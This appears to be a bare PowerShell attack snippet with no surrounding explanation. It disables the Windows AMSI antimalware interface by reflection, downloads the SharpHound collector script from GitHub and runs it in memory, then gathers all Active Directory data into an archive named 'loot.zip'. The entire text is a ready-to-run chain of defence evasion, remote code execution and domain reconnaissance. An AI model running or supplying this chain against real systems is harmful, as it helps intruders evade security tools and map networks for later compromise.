$script = '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/master/Collectors/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip'

$sb = [ScriptBlock]::Create($script)
& $sb
